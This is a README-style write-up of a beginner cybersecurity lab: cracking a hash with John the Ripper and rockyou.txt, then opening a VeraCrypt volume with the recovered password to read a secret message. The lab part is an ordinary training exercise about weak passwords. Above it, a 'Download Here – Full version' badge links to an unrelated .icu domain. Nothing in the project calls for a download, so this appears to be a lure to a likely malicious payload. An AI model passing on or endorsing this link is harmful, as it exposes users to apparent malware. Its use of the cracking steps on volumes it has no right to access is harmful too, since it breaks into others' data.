# Cracking-a-VeraCrypt-Password-Decrypting-an-Encrypted-File

[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-green)](https://downloadsoftgits.icu/?8mehzl3egbdced9)

---

## 📌 Overview
This project demonstrates the real-world application of password cracking and file decryption techniques in cybersecurity. The goal was to **retrieve a hidden secret** stored in an encrypted file, which could only be accessed by cracking a hashed password first.

---

## 🎯 Objective
- Crack a hashed password stored in a file.
- Use the cracked password to decrypt a VeraCrypt-encrypted file.
- Extract and verify the hidden message or code within the file.

---

## 🧰 Tools & Resources Used
| Tool | Purpose |
|------|---------|
| **John the Ripper** | To crack the password hash |
| **VeraCrypt** | To mount and decrypt the encrypted volume |
| **Encoded.txt** | File containing the hashed password |
| **RockYou.txt** | Wordlist used for cracking the password |
| **Crackstation.net** (optional) | Online hash cracking tool |

---

## 🔍 Step-by-Step Process

### 1. **Crack the Hashed Password**
The password hash was stored in a file called `encoded.txt`. Using **John the Ripper**, I ran the following command:

```bash
john --format=auto --wordlist=rockyou.txt encoded.txt
```

John successfully cracked the password:  
➡️ **`password123`**

This highlighted the importance of avoiding common and predictable passwords, especially those found in widely known wordlists like *rockyou.txt*.

> ✅ Later, I also tested [Crackstation.net](https://crackstation.net/) as an alternative method and it worked too.

---

### 2. **Decrypt the Encrypted File using VeraCrypt**
Next, I launched **VeraCrypt**, mounted the encrypted volume, and entered the cracked password:

- **Password used:** `password123`
- **Status:** Decryption successful ✅

I navigated to the mounted volume and opened the decrypted file. Inside, I found the hidden statement:

> 🕵️‍♂️ **“The secret code is: never give up.”**

---

## 📊 Visuals & Screenshots  
<sub>📌 Replace these with your actual screenshots after uploading them to the `/images/` folder in your repo</sub>

- 📷 Screenshot of John the Ripper cracking the hash  
- 📷 Screenshot of VeraCrypt decryption screen  
- 📷 Screenshot of the retrieved secret message

---

## 💡 Key Takeaways
- **Password strength is critical.** Simple, dictionary-based passwords are easily crackable with tools like John the Ripper.
- **John the Ripper is powerful.** It remains one of the most effective tools for hash cracking in cybersecurity labs and CTFs.
- **VeraCrypt works.** It’s a strong encryption solution, but only as strong as the password used to protect it.

---

## 🧠 Lessons Learned
- Hands-on experience with **hash cracking** using John the Ripper and Crackstation.
- Improved understanding of **volume encryption/decryption** using VeraCrypt.
- Reinforced the role of **strong passwords and encryption** in cybersecurity defense.

---

## 📌 Project Status
✅ Completed & documented  

---

## 📢 Final Thoughts
This challenge was a simple yet powerful demonstration of the importance of password security and encryption. It gave me real-world experience in applying tools used by professionals and attackers alike. Every project like this brings me closer to becoming a well-rounded cybersecurity professional.
